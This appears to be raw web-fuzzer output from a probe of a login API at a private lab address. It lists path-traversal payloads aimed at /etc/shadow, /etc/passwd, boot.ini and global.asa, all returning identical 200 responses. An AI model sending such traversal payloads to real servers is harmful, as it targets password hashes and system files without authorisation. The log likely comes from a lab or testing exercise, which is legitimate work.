Target: http://10.10.10.16/api/login
Total requests: 468
==============================================================================================================================================
ID    C.Time   Response   Lines      Word         Chars                  Server                                             Redirect   Payload    
==============================================================================================================================================
00086:  0.052s   C=00086:  C=200      0 L	       2 W	     21 Ch                                                                              "\..\..\..\..\..\..\..\..\..\..\etc\shadow%00"
00088:  0.051s   C=00088:  C=200      0 L	       2 W	     21 Ch                                                                              "..\..\..\..\..\..\..\..\..\..\etc\shadow%00"
00085:  0.105s   C=00085:  C=200      0 L	       2 W	     21 Ch                                                                              "\..\..\..\..\..\..\..\..\..\..\etc\passwd%00"
00079:  0.051s   C=00079:  C=200      0 L	       2 W	     21 Ch                                                                              "..\..\..\..\..\..\..\..\..\..\etc\passwd"
00078:  0.051s   C=00078:  C=200      0 L	       2 W	     21 Ch                                                                              "\..\..\..\..\..\..\..\..\..\..\etc\shadow"
00071:  0.051s   C=00071:  C=200      0 L	       2 W	     21 Ch                                                                              "/../../../../../../../../../../etc/passwd^^"
00082:  0.105s   C=00082:  C=200      0 L	       2 W	     21 Ch                                                                              "/..\../..\../..\../..\../..\../..\../etc/shadow"
00081:  0.051s   C=00081:  C=200      0 L	       2 W	     21 Ch                                                                              "/..\../..\../..\../..\../..\../..\../etc/passwd"
00074:  0.051s   C=00074:  C=200      0 L	       2 W	     21 Ch                                                                              "/../../../../../../../../../../etc/shadow"
00075:  0.051s   C=00075:  C=200      0 L	       2 W	     21 Ch                                                                              "/./././././././././././etc/passwd"
00080:  0.051s   C=00080:  C=200      0 L	       2 W	     21 Ch                                                                              "..\..\..\..\..\..\..\..\..\..\etc\shadow"
00077:  0.052s   C=00077:  C=200      0 L	       2 W	     21 Ch                                                                              "\..\..\..\..\..\..\..\..\..\..\etc\passwd"
00073:  0.049s   C=00073:  C=200      0 L	       2 W	     21 Ch                                                                              "/../../../../../../../../../../etc/passwd"
00123:  0.050s   C=00123:  C=200      0 L	       2 W	     21 Ch                                                                              "\..\..\..\..\..\..\..\..\..\..\boot.ini"
00139:  0.050s   C=00139:  C=200      0 L	       2 W	     21 Ch                                                                              "*"
00111:  0.051s   C=00111:  C=200      0 L	       2 W	     21 Ch                                                                              "C:\inetpub\wwwroot\global.asa"
